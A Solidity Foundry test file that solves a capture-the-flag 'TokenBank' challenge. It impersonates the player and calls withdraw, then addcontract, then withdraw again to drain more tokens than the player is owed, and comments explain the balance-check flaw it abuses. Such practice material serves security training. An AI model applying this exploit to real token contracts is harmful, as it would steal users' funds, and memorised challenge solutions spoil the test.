// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/TokenBank.sol";

contract TankBankTest is Test {
    TokenBankChallenge public tokenBankChallenge;
    TokenBankAttacker public tokenBankAttacker;
    address player = address(1234);

    function setUp() public {}

    function testExploit() public {
        tokenBankChallenge = new TokenBankChallenge(player);
        tokenBankAttacker = new TokenBankAttacker(address(tokenBankChallenge));

        // Put your solution here
        /**
            1. Call withdraw function of tokenBankChallenge twice,each time make sure the player's  balance for TokenBankChallenge equal:500000 * 10 ** 18
            2: Player will get 500000 * 10 ** 18 TokenBankChallenge Token in the beginning, after call withdraw first time, and use addcontract to make the play get
            the same TokenBankChallenge Token again. 
            3. Because the TokenBankChallenge mistakely judge its token's balance before transfer SimpleERC223Token token, So caller can transfer  any amount of SimpleERC223Token token
            if the caller has enough TokenBankChallenge token.
         */
        SimpleERC223Token token =  SimpleERC223Token(tokenBankChallenge.token());

        vm.startPrank(player);

        tokenBankChallenge.withdraw(tokenBankChallenge.balanceOf(player));
        tokenBankChallenge.addcontract(player);
        tokenBankChallenge.withdraw(tokenBankChallenge.balanceOf(player));


        vm.stopPrank();

        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(tokenBankChallenge.isComplete(), "Challenge Incomplete");
    }
}
